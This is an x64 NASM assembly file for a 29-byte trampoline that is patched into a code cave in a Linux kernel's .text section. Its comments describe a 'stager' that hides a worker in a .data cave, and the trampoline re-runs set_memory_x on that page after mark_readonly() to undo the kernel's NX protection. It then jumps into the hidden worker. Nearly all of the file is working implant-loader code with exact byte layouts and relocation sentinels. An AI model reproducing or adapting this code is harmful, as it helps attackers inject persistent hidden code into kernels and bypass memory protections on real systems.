; lkm_worker_resume.asm
; 29-byte x64 trampoline written into a .text code cave.
;
; Problem: after all late_initcalls complete, kernel_init() calls mark_readonly()
; which sets the NX bit on .data pages, reverting the set_memory_x() call the
; stager made at initcall time.  When the work item eventually fires (after
; msleep returns), lkm_worker is in a .data page that is NX again → #PF.
;
; This blob lives in .text (permanently executable) and is the work_func_t
; stored in work_struct.func.  On each invocation it:
;   1. Re-calls set_memory_x(loader_cave_page, 1) to restore executability.
;   2. Tail-calls lkm_worker in the .data cave (which is now executable).
;
; Calling convention: work_func_t — void fn(struct work_struct *work)
; On entry: rsp % 16 == 8  (caller pushed return addr onto aligned stack)
; After push rbp: rsp % 16 == 0 (16-byte aligned before any call)
;
; Assemble (flat binary):
;   nasm -f bin -o lkm_worker_resume.bin lkm_worker_resume.asm
;
; Blob layout (29 bytes, offsets from blob start):
;   [0]   55                   push rbp
;   [1]   48 8D 3D xx xx xx xx lea rdi, [rip + CAVE_PAGE_DISP_SENTINEL]
;   [8]   48 81 E7 00 F0 FF FF and rdi, -4096          (page-align to loader cave)
;   [15]  6A 01                push 1
;   [17]  5E                   pop rsi                 (nrpages = 1)
;   [18]  E8 xx xx xx xx       call SET_MEMORY_X_REL_SENTINEL
;   [23]  5D                   pop rbp
;   [24]  E9 xx xx xx xx       jmp LKM_WORKER_REL_SENTINEL
;
; Sentinels (patched as i32 PC-relative offsets by Rust before writing blob):
;   CAVE_PAGE_DISP_SENTINEL   0x11223344  bytes [4..8]    disp32 in lea rdi,[rip+d]
;                                                          → any addr within loader cave
;   SET_MEMORY_X_REL_SENTINEL 0x55667788  bytes [19..23]  rel32 for call set_memory_x
;   LKM_WORKER_REL_SENTINEL   0xFEDCBA98  bytes [25..29]  rel32 for jmp lkm_worker

BITS 64
default rel

lkm_worker_resume:
    push    rbp                         ; [1]  align rsp for call

    ; Load the runtime address of the loader cave via RIP-relative LEA.
    ; disp32 patched by Rust: loader_cave_virt - (worker_resume_cave_virt + 8)
    db      0x48, 0x8D, 0x3D           ; REX.W LEA rdi, [rip + disp32]   [3]
    dd      0x11223344                  ; CAVE_PAGE_DISP_SENTINEL          [4]
    ; rip now points here (worker_resume_cave_virt + 8); rdi = loader_cave_virt

    and     rdi, -4096                  ; 48 81 E7 00 F0 FF FF  [7]  page-align

    push    1                           ; 6A 01       [2]  arg2: nrpages = 1
    pop     rsi                         ; 5E          [1]

    ; Call set_memory_x(loader_cave_page, 1) to restore executability of .data cave.
    ; rel32 patched by Rust: set_memory_x_virt - (worker_resume_cave_virt + 23)
    db      0xE8                        ; CALL rel32                       [1]
    dd      0x55667788                  ; SET_MEMORY_X_REL_SENTINEL        [4]

    pop     rbp                         ; [1]  restore frame pointer

    ; Tail-call lkm_worker in the .data cave (now executable).
    ; rel32 patched by Rust: lkm_worker_virt - (worker_resume_cave_virt + 29)
    db      0xE9                        ; JMP rel32                        [1]
    dd      0xFEDCBA98                  ; LKM_WORKER_REL_SENTINEL          [4]
                                        ; ─────────────────────────────────────
                                        ; Total bytes: 1+7+7+2+1+5+1+5 = 29
